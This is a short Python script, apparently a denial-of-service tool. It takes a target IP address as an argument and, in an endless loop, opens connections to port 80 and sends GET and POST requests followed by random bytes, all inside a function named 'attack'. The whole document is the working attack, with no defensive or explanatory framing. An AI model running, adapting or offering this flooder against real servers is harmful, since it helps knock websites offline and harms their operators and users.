import socket, sys, os, random, string
IP_ADDR=sys.argv[1]
PORT=80

def rand(size=20, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

mess=bytes(rand().encode())

def attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP_ADDR, PORT))
    request = "GET / HTTP/1.1\r\nHost:%s\r\n\r\n" % IP_ADDR
    s.send(request.encode())
    request2 = "POST / HTTP/1.1\r\nHost:%s\r\n\r\n" % IP_ADDR
    s.send(request2.encode())
    s.send(mess)
    s.close()
    
while True:  
    attack()